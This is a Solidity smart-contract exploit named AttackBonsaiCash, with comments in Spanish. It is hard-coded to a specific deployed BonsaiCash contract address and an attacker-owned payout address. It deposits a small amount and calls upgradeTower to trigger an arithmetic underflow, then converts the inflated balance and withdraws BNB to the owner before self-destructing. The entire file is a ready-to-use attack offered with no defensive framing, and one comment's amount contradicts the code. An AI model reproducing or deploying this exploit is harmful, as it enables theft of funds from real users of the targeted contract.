// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IBonsaiCash {

    struct Tower {
        uint256  mana;
        uint256  emeralds;
        uint256  emeralds2;
        uint256  yield;
        uint256  timestamp;
        uint256  hrs;
        address  ref;
        uint256  refs;
        uint256  refDeps;
        uint256  affiliateDeps;
        uint8    treasury;
        uint8[5] mages;
        bool     isAffiliate;

    }

    function towers(address _addr) external view returns (Tower memory);
    function addMana(address ref) external payable;
    function upgradeTower(uint256 towerId) external;
    function compound(uint256 emeralds) external;
    function withdrawMoney(uint256 emeralds) external;
}

contract AttackBonsaiCash {
    address payable owner;
    IBonsaiCash target = IBonsaiCash(0x203C9535664EeC4090A1f26fCa6a9f9A6fe8BEe6);

    constructor() {
        owner = payable(0x9816081E86870c282EeC3841cDab1Ea1d4D0d621); // dirección donde se enviarán los BNB
    }

    // 1. Función para obtener la marca de tiempo del usuario
    function getTimestampOf(address _addr) public view returns (uint256) {
        return target.towers(_addr).timestamp;

    }

    // 2. Función para obtener el balance de mana del usuario
    function getManaOf(address _addr) public view returns (uint256) {
        return target.towers(_addr).mana;

    }

    // 3. Función para obtener el número de mages de una torre específica para el usuario
    function getMagesOf(address _addr, uint256 towerId) public view returns (uint8) {
        require(towerId < 5, "Invalid towerId");
        return target.towers(_addr).mages[towerId];

    }

    // 4. Función para obtener el balance de emeralds del usuario
    function getEmeraldsOf(address _addr) public view returns (uint256) {
        return target.towers(_addr).emeralds;

    }

    // 1. Función para registrarse y obtener Mana inicial
    function registerAndAddMana() external {
        require(msg.sender == owner, "Not the owner");
        target.addMana{value: 0.0005 ether}(address(0));  // Enviamos 0.00015 BNB para tener un pequeño buffer adicional
    }

    // 2. Función para intentar producir el subdesbordamiento
    function triggerUnderflow(uint256 towerId) external {
        require(msg.sender == owner, "Not the owner");
        target.upgradeTower(towerId);
    }

    // 3. Función para convertir el Mana a Emeralds
    function convertManaToEmeralds(uint256 emeraldsAmount) external {
        require(msg.sender == owner, "Not the owner");
        target.compound(emeraldsAmount);
    }

    // 4. Función para retirar BNB usando esmeraldas
    function withdrawBNB(uint256 emeraldsToWithdraw) external {
        require(msg.sender == owner, "Not the owner");
        target.withdrawMoney(emeraldsToWithdraw);
    }

    // 5. Función para retirar cualquier BNB restante en este contrato de ataque
    function withdrawRemaining() external {
        require(msg.sender == owner, "Not the owner");
        owner.transfer(address(this).balance);
    }

    // Función de autodestrucción
    function destroy() external {
        require(msg.sender == owner, "Not the owner");
        selfdestruct(owner);
    }

    // Fallback function para recibir BNB
    receive() external payable {}
}